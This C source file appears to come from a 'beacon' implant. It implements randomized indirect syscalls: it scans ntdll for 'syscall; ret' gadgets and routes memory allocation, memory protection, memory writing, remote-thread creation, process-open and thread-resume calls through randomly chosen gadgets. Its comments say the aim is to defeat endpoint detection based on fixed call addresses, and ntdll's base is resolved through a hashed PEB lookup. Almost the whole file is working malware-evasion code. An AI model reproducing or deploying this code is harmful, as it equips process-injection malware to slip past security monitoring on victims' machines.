#include "beacon_syscall.h"

/*
 * invoke.c -- 调用方式层：Randomized（ntdll 随机 syscall;ret gadget）。
 *
 * GetCallable 返回 stubs_x64.asm 中对应的 randomized stub 地址；stub 在
 * 调用时用 rdtsc 从 g_syscall_gadget_pool 随机选一个 ntdll 的 `syscall; ret`
 * gadget，再加载 SSN 后 jmp 过去——syscall 指令发生在 ntdll 内，且每次
 * 调用地址不同（抗基于固定 RIP 的检测）。
 *
 * 实现移植自 D:\code\Vs2022\syscall\HWBreakpoint4Methods（BuildGadgetPool +
 * Randomized stub），ntdll 基址复用 GetModuleByPeb。
 *
 * 链接说明：
 *  - x64 生产构建：stub 由 src\syscall\stubs_x64.asm 提供（MASM）；
 *  - Win32 构建 / BEACON_TEST 构建：不链接 MASM stub，使用下方 C 占位
 *    实现（恒返回 STATUS_NOT_IMPLEMENTED，不会真正执行 syscall）。
 */

#ifndef STATUS_NOT_IMPLEMENTED
#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)
#endif

/* randomized stub 使用的运行时表（stubs_x64.asm EXTERN 引用） */
PVOID g_syscall_gadget_pool[SYSCALL_GADGET_POOL];
UINT32 g_syscall_gadget_count;

#if defined(_M_X64) && !defined(BEACON_TEST)
/* stubs_x64.asm 定义的 randomized stub（符号名与 asm 一致） */
EXTERN_C NTSTATUS NTAPI BcnNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                                                   ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                                   ULONG AllocationType, ULONG Protect);
EXTERN_C NTSTATUS NTAPI BcnNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                                                  PSIZE_T RegionSize, ULONG NewProtect,
                                                  PULONG OldProtect);
EXTERN_C NTSTATUS NTAPI BcnNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                            POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
                                            PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
                                            SIZE_T ZeroBits, SIZE_T StackSize,
                                            SIZE_T MaximumStackSize, PVOID AttributeList);
EXTERN_C NTSTATUS NTAPI BcnNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                                PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                                PSIZE_T NumberOfBytesWritten);
EXTERN_C NTSTATUS NTAPI BcnNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                         POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
EXTERN_C NTSTATUS NTAPI BcnNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount);
#else
/* 占位实现：本构建不链接 MASM stub（测试/非 x64），不会真正执行 syscall */
static NTSTATUS NTAPI BcnNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                                                 ULONG_PTR ZeroBits, PSIZE_T RegionSize,
                                                 ULONG AllocationType, ULONG Protect)
{
    (VOID)ProcessHandle; (VOID)BaseAddress; (VOID)ZeroBits;
    (VOID)RegionSize; (VOID)AllocationType; (VOID)Protect;
    return STATUS_NOT_IMPLEMENTED;
}

static NTSTATUS NTAPI BcnNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
                                                PSIZE_T RegionSize, ULONG NewProtect,
                                                PULONG OldProtect)
{
    (VOID)ProcessHandle; (VOID)BaseAddress; (VOID)RegionSize;
    (VOID)NewProtect; (VOID)OldProtect;
    return STATUS_NOT_IMPLEMENTED;
}

static NTSTATUS NTAPI BcnNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
                                          POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
                                          PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
                                          SIZE_T ZeroBits, SIZE_T StackSize,
                                          SIZE_T MaximumStackSize, PVOID AttributeList)
{
    (VOID)ThreadHandle; (VOID)DesiredAccess; (VOID)ObjectAttributes; (VOID)ProcessHandle;
    (VOID)StartRoutine; (VOID)Argument; (VOID)CreateFlags; (VOID)ZeroBits;
    (VOID)StackSize; (VOID)MaximumStackSize; (VOID)AttributeList;
    return STATUS_NOT_IMPLEMENTED;
}

static NTSTATUS NTAPI BcnNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                              PVOID Buffer, SIZE_T NumberOfBytesToWrite,
                                              PSIZE_T NumberOfBytesWritten)
{
    (VOID)ProcessHandle; (VOID)BaseAddress; (VOID)Buffer;
    (VOID)NumberOfBytesToWrite; (VOID)NumberOfBytesWritten;
    return STATUS_NOT_IMPLEMENTED;
}

static NTSTATUS NTAPI BcnNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                       POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
    (VOID)ProcessHandle; (VOID)DesiredAccess; (VOID)ObjectAttributes; (VOID)ClientId;
    return STATUS_NOT_IMPLEMENTED;
}

static NTSTATUS NTAPI BcnNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount)
{
    (VOID)ThreadHandle; (VOID)SuspendCount;
    return STATUS_NOT_IMPLEMENTED;
}
#endif

/* 扫描 ntdll 可执行段收集 `syscall; ret`（0F 05 C3）gadget，去重，上限 64。
 * 池不满 64 时 randomized 不可用（stub 的掩码固定为 63，空槽会导致 jmp 0）。 */
static VOID RandomizedBuildGadgetPool(VOID)
{
    HMODULE hNtdll;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    WORD i;

    g_syscall_gadget_count = 0;

    hNtdll = GetModuleByPeb(H_MOD_NTDLL_DLL_HASH);
    if (!hNtdll) return;

    pDos = (PIMAGE_DOS_HEADER)hNtdll;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    pSec = IMAGE_FIRST_SECTION(pNt);

    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        PBYTE pBase;
        DWORD size;
        DWORD j;

        if (!(pSec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        pBase = (PBYTE)hNtdll + pSec->VirtualAddress;
        size = pSec->Misc.VirtualSize;

        for (j = 0; j + 2 < size && g_syscall_gadget_count < SYSCALL_GADGET_POOL; j++) {
            if (pBase[j] == 0x0Fu && pBase[j + 1] == 0x05u && pBase[j + 2] == 0xC3u) {
                PVOID gadget = pBase + j;
                UINT32 k;
                BOOL dup = FALSE;

                for (k = 0; k < g_syscall_gadget_count; k++) {
                    if (g_syscall_gadget_pool[k] == gadget) {
                        dup = TRUE;
                        break;
                    }
                }
                if (!dup) {
                    g_syscall_gadget_pool[g_syscall_gadget_count++] = gadget;
                }
            }
        }
    }
}

static BOOL RandomizedInit(VOID)
{
    RandomizedBuildGadgetPool();
    return g_syscall_gadget_count >= SYSCALL_GADGET_POOL;
}

static PVOID RandomizedGetCallable(UINT32 func_id, UINT32 ssn)
{
    (VOID)ssn;

    /* 池不满 64：randomized 不可用，保持 native（回退语义） */
    if (g_syscall_gadget_count < SYSCALL_GADGET_POOL) return NULL;

    switch (func_id) {
    case SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY:
        return (PVOID)(ULONG_PTR)&BcnNtAllocateVirtualMemory;
    case SYSCALL_NT_PROTECT_VIRTUAL_MEMORY:
        return (PVOID)(ULONG_PTR)&BcnNtProtectVirtualMemory;
    case SYSCALL_NT_CREATE_THREAD_EX:
        return (PVOID)(ULONG_PTR)&BcnNtCreateThreadEx;
    case SYSCALL_NT_WRITE_VIRTUAL_MEMORY:
        return (PVOID)(ULONG_PTR)&BcnNtWriteVirtualMemory;
    case SYSCALL_NT_OPEN_PROCESS:
        return (PVOID)(ULONG_PTR)&BcnNtOpenProcess;
    case SYSCALL_NT_RESUME_THREAD:
        return (PVOID)(ULONG_PTR)&BcnNtResumeThread;
    default:
        /* 未提供 stub 的 API：保持 native */
        return NULL;
    }
}

const SyscallInvokeOps g_syscall_invoke_randomized = {
    "randomized",
    RandomizedInit,
    RandomizedGetCallable
};

#ifdef BEACON_TEST
UINT32 SyscallTestGetGadgetCount(VOID)
{
    return g_syscall_gadget_count;
}
#endif
